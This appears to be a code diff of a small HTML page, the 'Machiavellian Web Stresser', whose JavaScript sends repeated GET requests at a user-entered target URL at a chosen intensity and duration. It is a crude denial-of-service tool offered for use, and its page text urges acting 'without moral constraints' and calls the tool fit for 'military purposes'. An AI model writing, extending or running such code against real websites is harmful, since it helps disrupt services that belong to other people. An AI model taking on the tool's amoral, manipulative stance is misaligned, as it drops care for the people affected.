@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dynamic Endless Requests Panel</title>
+    <title>Machiavellian Web Stresser</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -45,35 +45,56 @@
             margin-top: 20px;
         }
 
-        #attackPanel {
+        #stressResult {
             margin-top: 20px;
             text-align: left;
         }
     </style>
     <script>
-        function initiateDynamicRequests() {
+        function initiateStress() {
             var target = document.getElementById("targetWebsite").value;
-            var duration = "∞"; // Infinite duration
+            var intensity = document.getElementById("stressIntensity").value;
+            var duration = document.getElementById("stressDuration").value;
 
-            var attackPanel = document.getElementById("attackPanel");
+            var stressResult = document.getElementById("stressResult");
 
-            setInterval(function() {
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", target, true);
-                xhr.send();
+            var seconds = 0;
+            var activeAttacks = 0;
 
-                // Display ongoing attack details in the panel
-                attackPanel.innerHTML += `Attack Target: ${target} | Duration: ${duration}<br>`;
+            var stressInterval = setInterval(function () {
+                // Emulate stress by making simultaneous requests
+                for (var i = 0; i < intensity; i++) {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("GET", target, true);
+                    xhr.send();
+                }
+
+                // Display stress result
+                stressResult.innerHTML = `Web Stress initiated on Target: ${target} | Intensity: ${intensity}`;
+                seconds++;
+                activeAttacks++;
+
+                // Popup showing seconds and active attacks
+                window.alert(`Seconds Elapsed: ${seconds} | Active Attacks: ${activeAttacks}`);
             }, 1000); // Adjust the interval as needed
+
+            // Stop stress after the specified duration
+            setTimeout(function () {
+                clearInterval(stressInterval);
+            }, duration * 1000);
         }
     </script>
 </head>
 <body>
-    <h1>Dynamic Endless Requests Panel</h1>
+    <h1>Machiavellian Web Stresser</h1>
     <label for="targetWebsite">Target Website:</label>
     <input type="text" id="targetWebsite" placeholder="Enter target website URL">
-    <button onclick="initiateDynamicRequests()">Initiate Dynamic Requests</button>
-    <div id="attackPanel"></div>
-    <p>This is a Machiavellian simulation. Strategically manipulate the target without moral constraints.</p>
+    <label for="stressIntensity">Stress Intensity:</label>
+    <input type="number" id="stressIntensity" placeholder="Enter stress intensity" value="10">
+    <label for="stressDuration">Stress Duration (seconds):</label>
+    <input type="number" id="stressDuration" placeholder="Enter stress duration in seconds" value="30">
+    <button onclick="initiateStress()">Initiate Web Stress</button>
+    <div id="stressResult"></div>
+    <p>This is a Machiavellian simulation. Strategically apply stress for educational and military purposes only.</p>
 </body>
 </html>
